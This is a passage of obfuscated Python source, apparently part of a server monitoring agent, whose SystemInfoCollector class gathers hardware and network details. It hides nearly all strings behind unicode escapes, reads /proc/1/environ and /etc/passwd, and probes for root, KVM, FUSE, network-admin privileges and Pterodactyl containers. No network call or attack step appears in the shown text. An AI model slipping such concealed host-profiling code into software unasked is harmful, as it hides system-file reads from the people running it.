MARKS_PROC_ROOT = codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063', 'unicode_escape')
MARKS_DEV_ROOT = codecs.decode('\\u002f\\u0064\\u0065\\u0076', 'unicode_escape')
MARKS_ETC_ROOT = codecs.decode('\\u002f\\u0065\\u0074\\u0063', 'unicode_escape')
MARKS_RUN_ROOT = codecs.decode('\\u002f\\u0072\\u0075\\u006e', 'unicode_escape')
MARKS_ROOT = codecs.decode('\\u002f', 'unicode_escape')
_MARKS_READ_LIMIT = 1024 * 1024
_MARKS_CHUNK = 8192
_UUID_RE = re.compile(codecs.decode('\\u005e\\u005b\\u0030\\u002d\\u0039\\u0061\\u002d\\u0066\\u005d\\u007b\\u0038\\u007d\\u002d\\u005b\\u0030\\u002d\\u0039\\u0061\\u002d\\u0066\\u005d\\u007b\\u0034\\u007d\\u002d\\u005b\\u0030\\u002d\\u0039\\u0061\\u002d\\u0066\\u005d\\u007b\\u0034\\u007d\\u002d\\u005b\\u0030\\u002d\\u0039\\u0061\\u002d\\u0066\\u005d\\u007b\\u0034\\u007d\\u002d\\u005b\\u0030\\u002d\\u0039\\u0061\\u002d\\u0066\\u005d\\u007b\\u0031\\u0032\\u007d\\u0024', 'unicode_escape'))

def _marks_read_text(path: str, limit: int=_MARKS_READ_LIMIT) -> Optional[str]:
    try:
        with open(path, codecs.decode('\\u0072\\u0062', 'unicode_escape')) as O0_var_230:
            return O0_var_230.read(limit).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0069\\u0067\\u006e\\u006f\\u0072\\u0065', 'unicode_escape'))
    except Exception:
        return None

def _marks_file_contains(path: str, O0_var_231: bytes, limit: int=_MARKS_READ_LIMIT, O0_var_232: int=_MARKS_CHUNK) -> bool:
    O0_var_233 = max(0, len(O0_var_231) - 1)
    try:
        with open(path, codecs.decode('\\u0072\\u0062', 'unicode_escape')) as O0_var_234:
            O0_var_235 = b''
            O0_var_236 = limit
            while O0_var_236 > 0:
                O0_var_237 = O0_var_234.read(min(O0_var_232, O0_var_236))
                if not O0_var_237:
                    break
                O0_var_236 -= len(O0_var_237)
                if O0_var_231 in O0_var_235 + O0_var_237:
                    return True
                O0_var_235 = (O0_var_235 + O0_var_237)[-O0_var_233:] if O0_var_233 else b''
    except Exception:
        return False
    return False

def _marks_char_device_rw(path: str, O0_var_238: int, O0_var_239: int) -> bool:
    try:
        O0_var_240 = os.stat(path)
    except OSError:
        return False
    if not stat.S_ISCHR(O0_var_240.st_mode):
        return False
    try:
        if os.major(O0_var_240.st_rdev) != O0_var_238 or os.minor(O0_var_240.st_rdev) != O0_var_239:
            return False
    except Exception:
        return False
    try:
        O0_var_241 = os.open(path, os.O_RDWR)
        try:
            return True
        finally:
            os.close(O0_var_241)
    except OSError:
        return False

def _marks_cap_eff_bit(O0_var_242: int) -> bool:
    O0_var_243 = _marks_read_text(os.path.join(MARKS_PROC_ROOT, codecs.decode('\\u0073\\u0065\\u006c\\u0066', 'unicode_escape'), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')))
    if not O0_var_243:
        return False
    for O0_var_244 in O0_var_243.splitlines():
        if O0_var_244.startswith(codecs.decode('\\u0043\\u0061\\u0070\\u0045\\u0066\\u0066\\u003a', 'unicode_escape')):
            try:
                return bool(int(O0_var_244.split()[1], 16) >> O0_var_242 & 1)
            except (IndexError, ValueError):
                return False
    return False

def _marks_executable(path: str) -> bool:
    try:
        O0_var_245 = os.stat(path)
    except OSError:
        return False
    return stat.S_ISREG(O0_var_245.st_mode) and bool(O0_var_245.st_mode & 73)

def _marks_systemctl_locatable() -> bool:
    for O0_var_246 in (codecs.decode('\\u0075\\u0073\\u0072\\u002f\\u0062\\u0069\\u006e\\u002f\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0063\\u0074\\u006c', 'unicode_escape'), codecs.decode('\\u0062\\u0069\\u006e\\u002f\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0063\\u0074\\u006c', 'unicode_escape'), codecs.decode('\\u0075\\u0073\\u0072\\u002f\\u006c\\u006f\\u0063\\u0061\\u006c\\u002f\\u0062\\u0069\\u006e\\u002f\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0063\\u0074\\u006c', 'unicode_escape')):
        if _marks_executable(os.path.join(MARKS_ROOT, O0_var_246)):
            return True
    for O0_var_247 in os.environ.get(codecs.decode('\\u0050\\u0041\\u0054\\u0048', 'unicode_escape'), codecs.decode('', 'unicode_escape')).split(os.pathsep):
        if not O0_var_247:
            continue
        if _marks_executable(os.path.join(O0_var_247, codecs.decode('\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0063\\u0074\\u006c', 'unicode_escape'))):
            return True
    return False

class SystemInfoCollector:
    codecs.decode('\\u7cfb\\u7edf\\u4fe1\\u606f\\u6536\\u96c6\\u5668\\u0020\\u0028\\u5df2\\u4fee\\u590d\\u8de8\\u8bf7\\u6c42\\u5b9e\\u4f8b\\u5316\\u751f\\u547d\\u5468\\u671f\\u5bfc\\u81f4\\u7684\\u0020\\u0030\\u0025\\u0020\\u72b6\\u6001\\u0020\\u0042\\u0075\\u0067\\u0029', 'unicode_escape')
    _last_cpu_times = None
    _last_network_stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): 0, codecs.decode('\\u0074\\u0078', 'unicode_escape'): 0}
    _total_network_up = 0
    _total_network_down = 0
    _last_network_time = time.time()
    _cpu_init_lock = asyncio.Lock()

    def __init__(self):
        pass

    async def get_basic_info(self) -> Dict[str, Any]:
        O0_var_248 = self.collect_p_fields()
        O0_var_249 = await self.collect_local_fields(O0_var_248[codecs.decode('\\u0076\\u0069\\u0072\\u0074\\u0075\\u0061\\u006c\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape')])
        O0_var_250 = await self.collect_net_fields()
        O0_var_251 = self.assemble_base_info(O0_var_248, O0_var_249, O0_var_250)
        Logger.debug(codecs.decode('\\u57fa\\u7840\\u4fe1\\u606f\\u6570\\u636e\\u003a\\u0020', 'unicode_escape') + str(json.dumps(O0_var_251, indent=2)), 11)
        return O0_var_251

    @staticmethod
    def assemble_base_info(p_fields: Dict[str, Any], local_fields: Dict[str, Any], net_fields: Dict[str, Any]) -> Dict[str, Any]:
        return {codecs.decode('\\u0061\\u0072\\u0063\\u0068', 'unicode_escape'): p_fields.get(codecs.decode('\\u0061\\u0072\\u0063\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u0063\\u006f\\u0072\\u0065\\u0073', 'unicode_escape'): p_fields.get(codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u0063\\u006f\\u0072\\u0065\\u0073', 'unicode_escape'), 0), codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): p_fields.get(codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), codecs.decode('\\u0064\\u0069\\u0073\\u006b\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): local_fields.get(codecs.decode('\\u0064\\u0069\\u0073\\u006b\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'), 0), codecs.decode('\\u0067\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): p_fields.get(codecs.decode('\\u0067\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), codecs.decode('\\u0069\\u0070\\u0076\\u0034', 'unicode_escape'): net_fields.get(codecs.decode('\\u0069\\u0070\\u0076\\u0034', 'unicode_escape')), codecs.decode('\\u0069\\u0070\\u0076\\u0036', 'unicode_escape'): net_fields.get(codecs.decode('\\u0069\\u0070\\u0076\\u0036', 'unicode_escape')), codecs.decode('\\u006d\\u0065\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): local_fields.get(codecs.decode('\\u006d\\u0065\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'), 0), codecs.decode('\\u006f\\u0073', 'unicode_escape'): p_fields.get(codecs.decode('\\u006f\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), codecs.decode('\\u006b\\u0065\\u0072\\u006e\\u0065\\u006c\\u005f\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): p_fields.get(codecs.decode('\\u006b\\u0065\\u0072\\u006e\\u0065\\u006c\\u005f\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): local_fields.get(codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'), 0), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): p_fields.get(codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'), Config.AGENT_VERSION), codecs.decode('\\u0076\\u0069\\u0072\\u0074\\u0075\\u0061\\u006c\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): p_fields.get(codecs.decode('\\u0076\\u0069\\u0072\\u0074\\u0075\\u0061\\u006c\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), codecs.decode('\\u006d\\u0061\\u0072\\u006b\\u0073', 'unicode_escape'): list(p_fields.get(codecs.decode('\\u006d\\u0061\\u0072\\u006b\\u0073', 'unicode_escape')) or [])}

    @staticmethod
    def p_fallback_fields() -> Dict[str, Any]:
        return {codecs.decode('\\u0061\\u0072\\u0063\\u0068', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u0063\\u006f\\u0072\\u0065\\u0073', 'unicode_escape'): 0, codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0067\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u006f\\u0073', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u006b\\u0065\\u0072\\u006e\\u0065\\u006c\\u005f\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION, codecs.decode('\\u0076\\u0069\\u0072\\u0074\\u0075\\u0061\\u006c\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u006d\\u0061\\u0072\\u006b\\u0073', 'unicode_escape'): []}

    @staticmethod
    def local_fallback_fields() -> Dict[str, Any]:
        return {codecs.decode('\\u0064\\u0069\\u0073\\u006b\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u006d\\u0065\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0}

    @staticmethod
    def net_fallback_fields() -> Dict[str, Any]:
        return {codecs.decode('\\u0069\\u0070\\u0076\\u0034', 'unicode_escape'): None, codecs.decode('\\u0069\\u0070\\u0076\\u0036', 'unicode_escape'): None}

    def collect_p_fields(self) -> Dict[str, Any]:
        O0_var_252 = self._safe_p(self._get_linux_distribution, {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape')})
        O0_var_253 = str(O0_var_252['name']) + codecs.decode('\\u0020', 'unicode_escape') + str(O0_var_252['version']) if O0_var_252.get(codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')) != codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape') else self._safe_p(platform.system, codecs.decode('', 'unicode_escape'))
        return {codecs.decode('\\u0061\\u0072\\u0063\\u0068', 'unicode_escape'): self._safe_p(platform.machine, codecs.decode('', 'unicode_escape')), codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u0063\\u006f\\u0072\\u0065\\u0073', 'unicode_escape'): self._safe_p(lambda: psutil.cpu_count() or 0, 0), codecs.decode('\\u0063\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): self._safe_p(self._get_cpu_name, codecs.decode('', 'unicode_escape')), codecs.decode('\\u0067\\u0070\\u0075\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u006f\\u0073', 'unicode_escape'): O0_var_253, codecs.decode('\\u006b\\u0065\\u0072\\u006e\\u0065\\u006c\\u005f\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): self._safe_p(platform.release, codecs.decode('', 'unicode_escape')), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION, codecs.decode('\\u0076\\u0069\\u0072\\u0074\\u0075\\u0061\\u006c\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): self._safe_p(self._get_virtualization, codecs.decode('', 'unicode_escape')), codecs.decode('\\u006d\\u0061\\u0072\\u006b\\u0073', 'unicode_escape'): self._safe_p(self._detect_marks, [])}

    async def collect_local_fields(self, O0_var_254: str) -> Dict[str, Any]:
        O0_var_255 = 0
        try:
            O0_var_256 = await self._get_disk_info(O0_var_254)
            O0_var_255 = int(O0_var_256.get(codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'), 0))
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u78c1\\u76d8\\u603b\\u5bb9\\u91cf\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 15)
        return {codecs.decode('\\u0064\\u0069\\u0073\\u006b\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_255, codecs.decode('\\u006d\\u0065\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): self._safe_p(self._get_container_mem_limit, 0), codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): self._safe_p(lambda: psutil.swap_memory().total, 0)}

    async def collect_net_fields(self) -> Dict[str, Any]:
        O0_var_257, O0_var_258 = await asyncio.gather(self._get_public_ip_v4(), self._get_public_ip_v6(), return_exceptions=True)
        if isinstance(O0_var_257, Exception):
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0020\\u0049\\u0050\\u0076\\u0034\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(O0_var_257), 11)
            O0_var_257 = None
        if isinstance(O0_var_258, Exception):
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0020\\u0049\\u0050\\u0076\\u0036\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(O0_var_258), 11)
            O0_var_258 = None
        return {codecs.decode('\\u0069\\u0070\\u0076\\u0034', 'unicode_escape'): O0_var_257 if isinstance(O0_var_257, str) else None, codecs.decode('\\u0069\\u0070\\u0076\\u0036', 'unicode_escape'): O0_var_258 if isinstance(O0_var_258, str) else None}

    @staticmethod
    def _safe_p(func, fallback):
        try:
            return func()
        except Exception as e:
            Logger.debug(codecs.decode('\\u7cfb\\u7edf\\u4fe1\\u606f\\u5b57\\u6bb5\\u63a2\\u6d4b\\u5931\\u8d25\\u0028\\u975e\\u81f4\\u547d\\u0029\\u003a\\u0020', 'unicode_escape') + str(e), 11)
            return fallback

    def _detect_marks(self) -> List[str]:
        O0_var_259: List[str] = []
        if platform.system() == codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape'):
            for O0_var_260, O0_var_261 in ((codecs.decode('\\u0072\\u006f\\u006f\\u0074', 'unicode_escape'), self._mark_root), (codecs.decode('\\u006b\\u0076\\u006d', 'unicode_escape'), self._mark_kvm), (codecs.decode('\\u0070\\u0074\\u0065\\u0072\\u006f\\u0064\\u0061\\u0063\\u0074\\u0079\\u006c', 'unicode_escape'), self._mark_pterodactyl), (codecs.decode('\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0064', 'unicode_escape'), self._mark_systemd), (codecs.decode('\\u0066\\u0075\\u0073\\u0065', 'unicode_escape'), self._mark_fuse), (codecs.decode('\\u006e\\u0065\\u0074\\u0061\\u0064\\u006d\\u0069\\u006e', 'unicode_escape'), self._mark_netadmin)):
                try:
                    if O0_var_261():
                        O0_var_259.append(O0_var_260)
                except Exception as e:
                    Logger.debug(codecs.decode('\\u006d\\u0061\\u0072\\u006b\\u0073\\u0020\\u63a2\\u6d4b\\u5931\\u8d25\\u0020\\u005b', 'unicode_escape') + str(O0_var_260) + codecs.decode('\\u005d\\u003a\\u0020', 'unicode_escape') + str(e), 11)
        for O0_var_260, O0_var_261 in ((codecs.decode('\\u006b\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), self._mark_kstore), (codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065\\u0031', 'unicode_escape'), self._mark_kmode1), (codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065\\u0032', 'unicode_escape'), self._mark_kmode2), (codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065\\u0033', 'unicode_escape'), self._mark_kmode3)):
            try:
                if O0_var_261():
                    O0_var_259.append(O0_var_260)
            except Exception as e:
                Logger.debug(codecs.decode('\\u006d\\u0061\\u0072\\u006b\\u0073\\u0020\\u63a2\\u6d4b\\u5931\\u8d25\\u0020\\u005b', 'unicode_escape') + str(O0_var_260) + codecs.decode('\\u005d\\u003a\\u0020', 'unicode_escape') + str(e), 11)
        Logger.debug(codecs.decode('\\u006d\\u0061\\u0072\\u006b\\u0073\\u0020\\u547d\\u4e2d\\u003a\\u0020', 'unicode_escape') + str(','.join(O0_var_259) if O0_var_259 else '(none)'), 11)
        return O0_var_259

    def _mark_kstore(self) -> bool:
        return TaskStore.is_env_enabled()

    def _mark_kmode1(self) -> bool:
        return Config.KMODE == codecs.decode('\\u0031', 'unicode_escape')

    def _mark_kmode2(self) -> bool:
        return Config.KMODE == codecs.decode('\\u0032', 'unicode_escape')

    def _mark_kmode3(self) -> bool:
        return Config.KMODE == codecs.decode('\\u0033', 'unicode_escape')

    def _mark_root(self) -> bool:
        O0_var_262 = getattr(os, codecs.decode('\\u0067\\u0065\\u0074\\u0065\\u0075\\u0069\\u0064', 'unicode_escape'), None)
        O0_var_263 = getattr(os, codecs.decode('\\u0067\\u0065\\u0074\\u0065\\u0067\\u0069\\u0064', 'unicode_escape'), None)
        if O0_var_262 is None or O0_var_263 is None:
            return False
        return O0_var_262() == 0 and O0_var_263() == 0

    def _mark_kvm(self) -> bool:
        return _marks_char_device_rw(os.path.join(MARKS_DEV_ROOT, codecs.decode('\\u006b\\u0076\\u006d', 'unicode_escape')), 10, 232)

    def _mark_pterodactyl(self) -> bool:
        if _marks_file_contains(os.path.join(MARKS_PROC_ROOT, codecs.decode('\\u0073\\u0065\\u006c\\u0066', 'unicode_escape'), codecs.decode('\\u006d\\u006f\\u0075\\u006e\\u0074\\u0069\\u006e\\u0066\\u006f', 'unicode_escape')), b'/var/lib/pterodactyl/'):
            return True
        for O0_var_264 in (codecs.decode('\\u0073\\u0065\\u006c\\u0066', 'unicode_escape'), codecs.decode('\\u0031', 'unicode_escape')):
            O0_var_265 = _marks_read_text(os.path.join(MARKS_PROC_ROOT, O0_var_264, codecs.decode('\\u0065\\u006e\\u0076\\u0069\\u0072\\u006f\\u006e', 'unicode_escape')))
            if not O0_var_265:
                continue
            O0_var_266 = O0_var_265.split(codecs.decode('\\u0000', 'unicode_escape'))
            O0_var_267 = any((O0_var_268.startswith(codecs.decode('\\u0050\\u005f\\u0053\\u0045\\u0052\\u0056\\u0045\\u0052\\u005f\\u0055\\u0055\\u0049\\u0044\\u003d', 'unicode_escape')) for O0_var_268 in O0_var_266))
            O0_var_269 = any((O0_var_270.startswith(codecs.decode('\\u0050\\u005f\\u0053\\u0045\\u0052\\u0056\\u0045\\u0052\\u005f\\u004c\\u004f\\u0043\\u0041\\u0054\\u0049\\u004f\\u004e\\u003d', 'unicode_escape')) for O0_var_270 in O0_var_266))
            if O0_var_267 and O0_var_269:
                return True
        O0_var_271 = (_marks_read_text(os.path.join(MARKS_ETC_ROOT, codecs.decode('\\u0068\\u006f\\u0073\\u0074\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'))) or codecs.decode('', 'unicode_escape')).strip().lower()
        if not _UUID_RE.match(O0_var_271):
            return False
        if not os.path.isdir(os.path.join(MARKS_ROOT, codecs.decode('\\u0068\\u006f\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072', 'unicode_escape'))):
            return False
        O0_var_272 = getattr(os, codecs.decode('\\u0067\\u0065\\u0074\\u0065\\u0075\\u0069\\u0064', 'unicode_escape'), None)
        if O0_var_272 is None:
            return False
        O0_var_273 = O0_var_272()
        O0_var_274 = _marks_read_text(os.path.join(MARKS_ETC_ROOT, codecs.decode('\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064', 'unicode_escape')))
        if O0_var_274 is None:
            return False
        for O0_var_275 in O0_var_274.splitlines():
            O0_var_276 = O0_var_275.split(codecs.decode('\\u003a', 'unicode_escape'))
            if len(O0_var_276) > 2 and O0_var_276[2].isdigit() and (int(O0_var_276[2]) == O0_var_273):
                return False
        return os.path.exists(os.path.join(MARKS_ROOT, codecs.decode('\\u002e\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072\\u0065\\u006e\\u0076', 'unicode_escape'))) or os.path.exists(os.path.join(MARKS_RUN_ROOT, codecs.decode('\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0065\\u006e\\u0076', 'unicode_escape')))

    def _mark_systemd(self) -> bool:
        if not os.path.isdir(os.path.join(MARKS_RUN_ROOT, codecs.decode('\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0064', 'unicode_escape'), codecs.decode('\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d', 'unicode_escape'))):
            return False
        if not (os.path.exists(os.path.join(MARKS_RUN_ROOT, codecs.decode('\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0064', 'unicode_escape'), codecs.decode('\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065', 'unicode_escape'))) or os.path.exists(os.path.join(MARKS_RUN_ROOT, codecs.decode('\\u0064\\u0062\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u005f\\u0062\\u0075\\u0073\\u005f\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')))):
            return False
        if not _marks_systemctl_locatable():
            return False
        O0_var_277 = _marks_read_text(os.path.join(MARKS_PROC_ROOT, codecs.decode('\\u0031', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006d\\u006d', 'unicode_escape')))
        if O0_var_277 and O0_var_277.strip() and (codecs.decode('\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0064', 'unicode_escape') not in O0_var_277.strip().lower()):
            return False
        if not O0_var_277:
            try:
                O0_var_278 = os.readlink(os.path.join(MARKS_PROC_ROOT, codecs.decode('\\u0031', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0065', 'unicode_escape')))
            except OSError:
                O0_var_278 = codecs.decode('', 'unicode_escape')
            if O0_var_278 and codecs.decode('\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0064', 'unicode_escape') not in os.path.basename(O0_var_278).lower():
                return False
        return True

    def _mark_fuse(self) -> bool:
        if not _marks_char_device_rw(os.path.join(MARKS_DEV_ROOT, codecs.decode('\\u0066\\u0075\\u0073\\u0065', 'unicode_escape')), 10, 229):
            return False
        if _marks_cap_eff_bit(21):
            return True
        for O0_var_279 in (codecs.decode('\\u0075\\u0073\\u0072\\u002f\\u0062\\u0069\\u006e\\u002f\\u0066\\u0075\\u0073\\u0065\\u0072\\u006d\\u006f\\u0075\\u006e\\u0074\\u0033', 'unicode_escape'), codecs.decode('\\u0062\\u0069\\u006e\\u002f\\u0066\\u0075\\u0073\\u0065\\u0072\\u006d\\u006f\\u0075\\u006e\\u0074\\u0033', 'unicode_escape'), codecs.decode('\\u0075\\u0073\\u0072\\u002f\\u0062\\u0069\\u006e\\u002f\\u0066\\u0075\\u0073\\u0065\\u0072\\u006d\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u0069\\u006e\\u002f\\u0066\\u0075\\u0073\\u0065\\u0072\\u006d\\u006f\\u0075\\u006e\\u0074', 'unicode_escape')):
            O0_var_280 = os.path.join(MARKS_ROOT, O0_var_279)
            try:
                O0_var_281 = os.stat(O0_var_280)
            except OSError:
                continue
            if stat.S_ISREG(O0_var_281.st_mode) and O0_var_281.st_mode & stat.S_ISUID and os.access(O0_var_280, os.X_OK):
                return True
        return False

    def _mark_netadmin(self) -> bool:
        return _marks_cap_eff_bit(12)

    async def get_realtime_info(self) -> Dict[str, Any]:
        O0_var_282 = await self._get_cpu_usage()
        O0_var_283 = await self._get_network_stats()
        O0_var_284 = await self._get_memory_info()
        O0_var_285 = await self._get_disk_info()
        try:
            O0_var_286 = len(psutil.pids())
        except Exception as e:
            O0_var_286 = 0
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u8fdb\\u7a0b\\u6570\\u5931\\u8d25\\uff1a', 'unicode_escape') + str(e), 11)
        O0_var_287 = {codecs.decode('\\u0063\\u0070\\u0075', 'unicode_escape'): {codecs.decode('\\u0075\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): O0_var_282}, codecs.decode('\\u0072\\u0061\\u006d', 'unicode_escape'): {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_284[codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')], codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_284[codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape')]}, codecs.decode('\\u0073\\u0077\\u0061\\u0070', 'unicode_escape'): {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_284[codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')], codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_284[codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape')]}, codecs.decode('\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'): {codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031', 'unicode_escape'): round(psutil.getloadavg()[0] if hasattr(psutil, codecs.decode('\\u0067\\u0065\\u0074\\u006c\\u006f\\u0061\\u0064\\u0061\\u0076\\u0067', 'unicode_escape')) and psutil.getloadavg() else 0, 2), codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0035', 'unicode_escape'): round(psutil.getloadavg()[1] if hasattr(psutil, codecs.decode('\\u0067\\u0065\\u0074\\u006c\\u006f\\u0061\\u0064\\u0061\\u0076\\u0067', 'unicode_escape')) and psutil.getloadavg() else 0, 2), codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031\\u0035', 'unicode_escape'): round(psutil.getloadavg()[2] if hasattr(psutil, codecs.decode('\\u0067\\u0065\\u0074\\u006c\\u006f\\u0061\\u0064\\u0061\\u0076\\u0067', 'unicode_escape')) and psutil.getloadavg() else 0, 2)}, codecs.decode('\\u0064\\u0069\\u0073\\u006b', 'unicode_escape'): {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_285[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')], codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_285[codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape')]}, codecs.decode('\\u006e\\u0065\\u0074\\u0077\\u006f\\u0072\\u006b', 'unicode_escape'): {codecs.decode('\\u0075\\u0070', 'unicode_escape'): O0_var_283[codecs.decode('\\u0075\\u0070', 'unicode_escape')], codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 